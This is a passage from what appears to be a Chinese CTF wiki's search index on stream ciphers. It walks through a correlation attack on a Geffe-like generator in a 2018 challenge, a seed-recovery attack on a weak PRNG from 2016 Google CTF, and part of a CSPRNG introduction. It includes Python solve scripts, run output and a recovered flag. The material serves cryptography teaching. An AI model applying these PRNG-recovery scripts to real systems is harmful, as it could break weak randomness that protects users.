x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3","title":"Geffe"},{"location":"crypto/streamcipher/fsr/nfsr/#2018-streamgame3","text":"\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 24 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW ,( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1 = int ( flag [ 5 : 11 ], 16 ) R2 = int ( flag [ 11 : 17 ], 16 ) R3 = int ( flag [ 17 : 23 ], 16 ) assert len ( bin ( R1 )[ 2 :]) == 17 assert len ( bin ( R2 )[ 2 :]) == 19 assert len ( bin ( R3 )[ 2 :]) == 21 R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 for fi in range ( 1024 ): print fi tmp1mb = \"\" for i in range ( 1024 ): tmp1kb = \"\" for j in range ( 1024 ): tmp = 0 for k in range ( 8 ): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) tmp = ( tmp << 1 ) ^ out tmp1kb += chr ( tmp ) tmp1mb += tmp1kb f = open ( \"./output/\" + str ( fi ), \"ab\" ) f . write ( tmp1mb ) f . close () \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u4e0e Geffe \u751f\u6210\u5668\u975e\u5e38\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u76f8\u5173\u653b\u51fb\u65b9\u6cd5\u8fdb\u884c\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u7edf\u8ba1\u4e00\u4e0b\u5728\u4e09\u4e2a LFSR \u8f93\u51fa\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u540e\u7c7b Geffe \u751f\u6210\u5668\u7684\u8f93\u51fa\uff0c\u5982\u4e0b x_1 x_1 x_2 x_2 x_3 x_3 F(x_1,x_2,x_3) F(x_1,x_2,x_3) 0 0 0 0 0 0 1 1 0 1 0 0 0 1 1 0 1 0 0 0 1 0 1 1 1 1 0 1 1 1 1 1 \u53ef\u4ee5\u53d1\u73b0 Geffe \u7684\u8f93\u51fa\u4e0e x_1 x_1 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75 Geffe \u7684\u8f93\u51fa\u4e0e x_2 x_2 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.5 Geffe \u7684\u8f93\u51fa\u4e0e x_3 x_3 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75 \u8fd9\u8bf4\u660e\u8f93\u51fa\u4e0e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a\u7684\u5173\u8054\u6027\u975e\u5e38\u5927\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u53bb\u679a\u4e3e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a LFSR \u7684\u8f93\u51fa\u5224\u65ad\u5176\u4e0e \u7c7b Geffe \u7684\u8f93\u51fa\u76f8\u7b49\u7684\u4e2a\u6570\uff0c\u5982\u679c\u5927\u7ea6\u5728 75% \u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u7b2c\u4e8c\u4e2a\u5c31\u76f4\u63a5\u66b4\u529b\u679a\u4e3e\u4e86\u3002 \u811a\u672c\u5982\u4e0b #for x1 in range(2): # for x2 in range(2): # for x3 in range(2): # print x1,x2,x3,(x1*x2)^((x2^1)*x3) #n = [17,19,21] #cycle = 1 #for i in n: # cycle = cycle*(pow(2,i)-1) #print cycle def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW , ( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 n3 = 21 n2 = 19 n1 = 17 def guess ( beg , end , num , mask ): ansn = range ( beg , end ) data = open ( './output/0' ) . read ( num ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) now = 0 res = 0 for i in ansn : r = i cnt = 0 for j in range ( num * 8 ): r , lastbit = lfsr ( r , mask ) lastbit = str ( lastbit ) cnt += ( lastbit == data [ j ]) if cnt > now : now = cnt res = i print now , res return res def bruteforce2 ( x , z ): data = open ( './output/0' ) . read ( 50 ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) for y in range ( pow ( 2 , n2 - 1 ), pow ( 2 , n2 )): R1 , R2 , R3 = x , y , z flag = True for i in range ( len ( data )): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) if str ( out ) != data [ i ]: flag = False break if y % 10000 == 0 : print 'now: ' , x , y , z if flag : print 'ans: ' , hex ( x )[ 2 :], hex ( y )[ 2 :], hex ( z )[ 2 :] break R1 = guess ( pow ( 2 , n1 - 1 ), pow ( 2 , n1 ), 40 , R1_mask ) print R1 R3 = guess ( pow ( 2 , n3 - 1 ), pow ( 2 , n3 ), 40 , R3_mask ) print R3 R1 = 113099 R3 = 1487603 bruteforce2 ( R1 , R3 ) \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b \u279c 2018 -CISCN-start-streamgame3 git: ( master ) \u2717 python exp.py 161 65536 172 65538 189 65545 203 65661 210 109191 242 113099 113099 157 1048576 165 1048578 183 1048580 184 1049136 186 1049436 187 1049964 189 1050869 190 1051389 192 1051836 194 1053573 195 1055799 203 1060961 205 1195773 212 1226461 213 1317459 219 1481465 239 1487603 1487603 now: 113099 270000 1487603 now: 113099 280000 1487603 now: 113099 290000 1487603 now: 113099 300000 1487603 now: 113099 310000 1487603 now: 113099 320000 1487603 now: 113099 330000 1487603 now: 113099 340000 1487603 now: 113099 350000 1487603 now: 113099 360000 1487603 ans: 1b9cb 5979c 16b2f3 \u4ece\u800c flag \u4e3a flag{01b9cb05979c16b2f3}\u3002","title":"2018 \u5f3a\u7f51\u676f streamgame3"},{"location":"crypto/streamcipher/fsr/nfsr/#_5","text":"2017 WHCTF Bornpig 2018 Google CTF 2018 Betterzip","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/fsr/nfsr/#_6","text":"https://www.rocq.inria.fr/secret/Anne.Canteaut/MPRI/chapter3.pdf http://data.at.preempted.net/INDEX/articles/Correlation_Attacks_Geffe.pdf","title":"\u53c2\u8003"},{"location":"crypto/streamcipher/lcg/challenge/","text":"\u9898\u76ee \u00b6 2016 Google CTF woodman \u00b6 \u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u5c31\u662f\u4e00\u4e2a\u731c\u6570\u6e38\u620f\uff0c\u5982\u679c\u8fde\u7eed\u731c\u4e2d\u82e5\u5e72\u6b21\uff0c\u5c31\u7b97\u4f1a\u62ff\u5230 flag\uff0c\u80cc\u540e\u7684\u751f\u6210\u76f8\u5e94\u6570\u7684\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b class SecurePrng ( object ): def __init__ ( self ): # generate seed with 64 bits of entropy self . p = 4646704883 L self . x = random . randint ( 0 , self . p ) self . y = random . randint ( 0 , self . p ) def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) \u8fd9\u91cc\u6211\u4eec\u663e\u7136\uff0c\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u7684\uff0c\u6bd5\u7adf\u6982\u7387\u4e5f\u6709 0.25\u3002\u8fd9\u91cc\u5f53\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u540e\uff0c\u4f7f\u7528 Z3 \u6765\u6c42\u89e3\u51fa\u521d\u59cb\u7684 x \u548c y\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u987a\u5229\u7684\u731c\u51fa\u5269\u4e0b\u7684\u503c\u4e86\u3002 \u5177\u4f53\u7684\u811a\u672c\u5982\u4e0b\uff0c\u7136\u800c Z3 \u5728\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\u65f6\u4f3c\u4e4e\u662f\u6709\u95ee\u9898\u7684\u3002\u3002\u3002 \u8fd9\u91cc\u6211\u4eec\u8003\u8651\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\uff0c \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u679a\u4e3e\u5230\u9ad8\u6bd4\u7279\u4f4d\u83b7\u53d6 x \u7684\u503c \uff0c\u4e4b\u6240\u4ee5\u80fd\u591f\u8fd9\u6837\u505a\uff0c\u662f\u4f9d\u8d56\u4e8e\u8fd9\u6837\u7684\u89c2\u5bdf a + b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u6536\u5230\u4f4e\u6bd4\u7279\u4f4d\u7684\u8fdb\u4f4d\u6570\u503c\u3002 a - b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u5411\u4f4e\u6bd4\u7279\u4f4d\u7684\u501f\u4f4d\u3002 a * b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u4ee5\u89c6\u4f5c\u591a\u6b21\u52a0\u6cd5\u3002 a % b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u89c6\u4e3a\u591a\u6b21\u8fdb\u884c\u51cf\u6cd5\u3002 a ^ b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u8fd9\u4e00\u70b9\u662f\u663e\u800c\u6613\u89c1\u7684\u3002 \u6ce8\uff1a\u4e2a\u4eba\u611f\u89c9\u8fd9\u4e2a\u6280\u5de7\u975e\u5e38\u6709\u7528\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u4e0d\u96be\u5f97\u77e5 p \u7684\u6bd4\u7279\u4f4d\u4e3a 33 \u6bd4\u7279\u4f4d\u3002\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6\u4e24\u6b21\u731c\u5230\u7684\u503c\uff0c\u8fd9\u4e2a\u6982\u7387\u6709 0.25\u3002 \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u5230\u9ad8\u6bd4\u7279\u4f4d\u4f9d\u6b21\u679a\u4e3e \u7b2c\u4e00\u6b21\u8fed\u4ee3\u540e\u7684 x \u7684\u76f8\u5e94\u6bd4\u7279\u4f4d \u3002 \u6839\u636e\u81ea\u5df1\u679a\u4e3e\u7684\u503c\u5206\u522b\u8ba1\u7b97\u51fa\u7b2c\u4e8c\u6b21\u7684\u503c\uff0c\u53ea\u6709\u5f53\u5bf9\u5e94\u6bd4\u7279\u4f4d\u6b63\u786e\uff0c\u53ef\u4ee5\u5c06\u5176\u52a0\u5165\u5019\u9009\u6b63\u786e\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7531\u4e8e\u53d6\u6a21\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u679a\u4e3e\u5230\u5e95\u51cf\u4e86\u591a\u5c11\u6b21\u3002 \u6b64\u5916\uff0c\u5728\u6700\u7ec8\u5224\u65ad\u65f6\uff0c\u4ecd\u7136\u9700\u8981\u786e\u4fdd\u5bf9\u5e94\u7684\u503c\u6ee1\u8db3\u4e00\u5b9a\u8981\u6c42\uff0c\u56e0\u4e3a\u4e4b\u524d\u5bf9\u51cf\u4e86\u591a\u5c11\u6b21\u8fdb\u884c\u4e86\u679a\u4e3e\u3002 \u5177\u4f53\u5229\u7528\u4ee3\u7801\u5982\u4e0b import os import random from itertools import product class SecurePrng ( object ): def __init__ ( self , x =- 1 , y =- 1 ): # generate seed with 64 bits of entropy self . p = 4646704883 L # 33bit if x == - 1 : self . x = random . randint ( 0 , self . p ) else : self . x = x if y == - 1 : self . y = random . randint ( 0 , self . p ) else : self . y = y def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) def getbiti ( num , idx ): return bin ( num )[ - idx - 1 :] def main (): sp = SecurePrng () targetx = sp . x targety = sp . y print \"we would like to get x \" , targetx print \"we would like to get y \" , targety # suppose we have already guess two number guess1 = sp . next () guess2 = sp . next () p = 4646704883 # newx = tmpx*2+3-kx*p for kx , ky in product ( range ( 3 ), range ( 4 )): candidate = [[ 0 ]] # only 33 bit for i in range ( 33 ): #print 'idx ', i new_candidate = [] for old , bit in product ( candidate , range ( 2 )): #print old, bit oldx = old [ 0 ] #oldy = old[1] tmpx = oldx | (( bit & 1 ) << i ) #tmpy = oldy | ((bit / 2) << i) tmpy = tmpx ^ guess1 newx = tmpx * 2 + 3 - kx * p + ( 1 << 40 ) newy = tmpy * 3 + 9 - ky * p + ( 1 << 40 ) tmp1 = newx ^ newy #print \"tmpx: \", bin(tmpx) #print \"targetx: \", bin(targetx) #print \"calculate: \", bin(tmp1 + (1 << 40)) #print \"target guess2: \", bin(guess1 + (1 << 40)) if getbiti ( guess2 + ( 1 << 40 ), i ) == getbiti ( tmp1 + ( 1 << 40 ), i ): if [ tmpx ] not in new_candidate : #print \"got one\" #print bin(tmpx) #print bin(targetx) #print bin(tmpy) new_candidate . append ([ tmpx ]) candidate = new_candidate #print len(candidate) #print candidate print \"candidate x for kx: \" , kx , \" ky \" , ky for item in candidate : tmpx = candidate [ 0 ][ 0 ] tmpy = tmpx ^ guess1 if tmpx >= p or tmpx >= p : continue mysp = SecurePrng ( tmpx , tmpy ) tmp1 = mysp . next () if tmp1 != guess2 : continue print tmpx , tmpy print ( targetx * 2 + 3 ) % p , ( targety * 3 + 9 ) % p if __name__ == \"__main__\" : main ()","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/lcg/challenge/#_1","text":"","title":"\u9898\u76ee"},{"location":"crypto/streamcipher/lcg/challenge/#2016-google-ctf-woodman","text":"\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u5c31\u662f\u4e00\u4e2a\u731c\u6570\u6e38\u620f\uff0c\u5982\u679c\u8fde\u7eed\u731c\u4e2d\u82e5\u5e72\u6b21\uff0c\u5c31\u7b97\u4f1a\u62ff\u5230 flag\uff0c\u80cc\u540e\u7684\u751f\u6210\u76f8\u5e94\u6570\u7684\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b class SecurePrng ( object ): def __init__ ( self ): # generate seed with 64 bits of entropy self . p = 4646704883 L self . x = random . randint ( 0 , self . p ) self . y = random . randint ( 0 , self . p ) def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) \u8fd9\u91cc\u6211\u4eec\u663e\u7136\uff0c\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u7684\uff0c\u6bd5\u7adf\u6982\u7387\u4e5f\u6709 0.25\u3002\u8fd9\u91cc\u5f53\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u540e\uff0c\u4f7f\u7528 Z3 \u6765\u6c42\u89e3\u51fa\u521d\u59cb\u7684 x \u548c y\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u987a\u5229\u7684\u731c\u51fa\u5269\u4e0b\u7684\u503c\u4e86\u3002 \u5177\u4f53\u7684\u811a\u672c\u5982\u4e0b\uff0c\u7136\u800c Z3 \u5728\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\u65f6\u4f3c\u4e4e\u662f\u6709\u95ee\u9898\u7684\u3002\u3002\u3002 \u8fd9\u91cc\u6211\u4eec\u8003\u8651\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\uff0c \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u679a\u4e3e\u5230\u9ad8\u6bd4\u7279\u4f4d\u83b7\u53d6 x \u7684\u503c \uff0c\u4e4b\u6240\u4ee5\u80fd\u591f\u8fd9\u6837\u505a\uff0c\u662f\u4f9d\u8d56\u4e8e\u8fd9\u6837\u7684\u89c2\u5bdf a + b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u6536\u5230\u4f4e\u6bd4\u7279\u4f4d\u7684\u8fdb\u4f4d\u6570\u503c\u3002 a - b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002 \u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u5411\u4f4e\u6bd4\u7279\u4f4d\u7684\u501f\u4f4d\u3002 a * b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u4ee5\u89c6\u4f5c\u591a\u6b21\u52a0\u6cd5\u3002 a % b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u89c6\u4e3a\u591a\u6b21\u8fdb\u884c\u51cf\u6cd5\u3002 a ^ b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u8fd9\u4e00\u70b9\u662f\u663e\u800c\u6613\u89c1\u7684\u3002 \u6ce8\uff1a\u4e2a\u4eba\u611f\u89c9\u8fd9\u4e2a\u6280\u5de7\u975e\u5e38\u6709\u7528\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u4e0d\u96be\u5f97\u77e5 p \u7684\u6bd4\u7279\u4f4d\u4e3a 33 \u6bd4\u7279\u4f4d\u3002\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6\u4e24\u6b21\u731c\u5230\u7684\u503c\uff0c\u8fd9\u4e2a\u6982\u7387\u6709 0.25\u3002 \u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u5230\u9ad8\u6bd4\u7279\u4f4d\u4f9d\u6b21\u679a\u4e3e \u7b2c\u4e00\u6b21\u8fed\u4ee3\u540e\u7684 x \u7684\u76f8\u5e94\u6bd4\u7279\u4f4d \u3002 \u6839\u636e\u81ea\u5df1\u679a\u4e3e\u7684\u503c\u5206\u522b\u8ba1\u7b97\u51fa\u7b2c\u4e8c\u6b21\u7684\u503c\uff0c\u53ea\u6709\u5f53\u5bf9\u5e94\u6bd4\u7279\u4f4d\u6b63\u786e\uff0c\u53ef\u4ee5\u5c06\u5176\u52a0\u5165\u5019\u9009\u6b63\u786e\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7531\u4e8e\u53d6\u6a21\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u679a\u4e3e\u5230\u5e95\u51cf\u4e86\u591a\u5c11\u6b21\u3002 \u6b64\u5916\uff0c\u5728\u6700\u7ec8\u5224\u65ad\u65f6\uff0c\u4ecd\u7136\u9700\u8981\u786e\u4fdd\u5bf9\u5e94\u7684\u503c\u6ee1\u8db3\u4e00\u5b9a\u8981\u6c42\uff0c\u56e0\u4e3a\u4e4b\u524d\u5bf9\u51cf\u4e86\u591a\u5c11\u6b21\u8fdb\u884c\u4e86\u679a\u4e3e\u3002 \u5177\u4f53\u5229\u7528\u4ee3\u7801\u5982\u4e0b import os import random from itertools import product class SecurePrng ( object ): def __init__ ( self , x =- 1 , y =- 1 ): # generate seed with 64 bits of entropy self . p = 4646704883 L # 33bit if x == - 1 : self . x = random . randint ( 0 , self . p ) else : self . x = x if y == - 1 : self . y = random . randint ( 0 , self . p ) else : self . y = y def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) def getbiti ( num , idx ): return bin ( num )[ - idx - 1 :] def main (): sp = SecurePrng () targetx = sp . x targety = sp . y print \"we would like to get x \" , targetx print \"we would like to get y \" , targety # suppose we have already guess two number guess1 = sp . next () guess2 = sp . next () p = 4646704883 # newx = tmpx*2+3-kx*p for kx , ky in product ( range ( 3 ), range ( 4 )): candidate = [[ 0 ]] # only 33 bit for i in range ( 33 ): #print 'idx ', i new_candidate = [] for old , bit in product ( candidate , range ( 2 )): #print old, bit oldx = old [ 0 ] #oldy = old[1] tmpx = oldx | (( bit & 1 ) << i ) #tmpy = oldy | ((bit / 2) << i) tmpy = tmpx ^ guess1 newx = tmpx * 2 + 3 - kx * p + ( 1 << 40 ) newy = tmpy * 3 + 9 - ky * p + ( 1 << 40 ) tmp1 = newx ^ newy #print \"tmpx: \", bin(tmpx) #print \"targetx: \", bin(targetx) #print \"calculate: \", bin(tmp1 + (1 << 40)) #print \"target guess2: \", bin(guess1 + (1 << 40)) if getbiti ( guess2 + ( 1 << 40 ), i ) == getbiti ( tmp1 + ( 1 << 40 ), i ): if [ tmpx ] not in new_candidate : #print \"got one\" #print bin(tmpx) #print bin(targetx) #print bin(tmpy) new_candidate . append ([ tmpx ]) candidate = new_candidate #print len(candidate) #print candidate print \"candidate x for kx: \" , kx , \" ky \" , ky for item in candidate : tmpx = candidate [ 0 ][ 0 ] tmpy = tmpx ^ guess1 if tmpx >= p or tmpx >= p : continue mysp = SecurePrng ( tmpx , tmpy ) tmp1 = mysp . next () if tmp1 != guess2 : continue print tmpx , tmpy print ( targetx * 2 + 3 ) % p , ( targety * 3 + 9 ) % p if __name__ == \"__main__\" : main ()","title":"2016 Google CTF woodman"},{"location":"crypto/streamcipher/lcg/intro/","text":"\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668 \u00b6 \u5f85\u8865\u5145\u3002","title":"\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668"},{"location":"crypto/streamcipher/lcg/intro/#_1","text":"\u5f85\u8865\u5145\u3002","title":"\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668"},{"location":"crypto/streamcipher/prng/csprng/","text":"\u5bc6\u7801\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668 \u00b6 \u4ecb\u7ecd \u00b6 \u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographically secure pseudo-random number generator\uff0cCSPRNG\uff09\uff0c\u4e5f\u79f0\u4e3a\u5bc6\u7801\u5b66\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographic pseudo-random number generator\uff0cCPRNG\uff09\uff0c\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u5b83\u9700\u8981\u6ee1\u8db3\u6ee1\u8db3\u4e00\u4e9b\u5fc5\u8981\u7684\u7279\u6027\uff0c\u4ee5\u4fbf\u4e8e\u9002\u5408\u4e8e\u5bc6\u7801\u5b66\u5e94\u7528\u3002 \u5bc6\u7801\u5b66\u7684\u5f88\u591a\u65b9\u9762\u90fd\u9700\u8981\u968f\u673a\u6570 \u5bc6\u94a5\u751f\u6210 \u751f\u6210\u521d\u59cb\u5316\u5411\u91cf\uff0cIV\uff0c\u7528\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684 CBC\uff0cCFB\uff0cOFB \u6a21\u5f0f nounce\uff0c\u7528\u4e8e\u9632\u6b62\u91cd\u653e\u653b\u51fb\u4ee5\u53ca\u5206\u7ec4\u5bc6\u7801\u7684 CTR \u6a21\u5f0f\u7b49\u3001 one-time pads \u67d0\u4e9b\u7b7e\u540d\u65b9\u6848\u4e2d\u7684\u76d0\uff0c\u5982 ECDSA \uff0c RSASSA-PSS \u9700\u6c42 \u00b6 \u6beb\u65e0\u7591\u95ee\uff0c\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u8981\u6c42\u80af\u5b9a\u6bd4\u4e00\u822c\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u8981\u9ad8\u3002\u4e00\u822c\u800c\u8a00\uff0cCSPRNG \u7684\u8981\u6c42\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b \u901a\u8fc7\u7edf\u8ba1\u968f\u673a\u6027\u6d4b\u8bd5\u3002CSPRNG \u5fc5\u987b\u901a\u8fc7 next-bit test \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u77e5\u9053\u4e86\u4e00\u4e2a\u5e8f\u5217\u7684\u524d k \u4e2a\u6bd4\u7279\uff0c\u653b\u51fb\u8005\u4e0d\u53ef\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u4ee5\u5927\u4e8e 50% \u7684\u6982\u7387\u9884\u6d4b\u51fa\u6765\u4e0b\u4e00\u4e2a\u6bd4\u7279\u4f4d\u3002\u8fd9\u91cc\u7279\u522b\u63d0\u53ca\u4e00\u70b9\uff0c\u59da\u671f\u667a\u66fe\u5728 1982 \u5e74\u8bc1\u660e\uff0c\u5982\u679c\u4e00\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u901a\u8fc7 next-bit test \uff0c\u90a3\u4e48\u5b83\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6240\u6709\u5176\u4ed6\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7edf\u8ba1\u6d4b\u8bd5\u3002 \u5fc5\u987b\u80fd\u591f\u62b5\u6297\u8db3\u591f\u5f3a\u7684\u653b\u51fb\uff0c\u6bd4\u5982\u5f53\u751f\u6210\u5668\u7684\u90e8\u5206\u521d\u59cb\u72b6\u6001\u6216\u8005\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u88ab\u653b\u51fb\u8005\u83b7\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u4e0d\u80fd\u591f\u83b7\u53d6\u6cc4\u6f0f\u72b6\u6001\u4e4b\u524d\u7684\u751f\u6210\u7684\u968f\u673a\u6570\u3002 \u5206\u7c7b \u00b6 \u5c31\u76ee\u524d\u800c\u770b\uff0c CSPRNG \u7684\u8bbe\u8ba1\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b 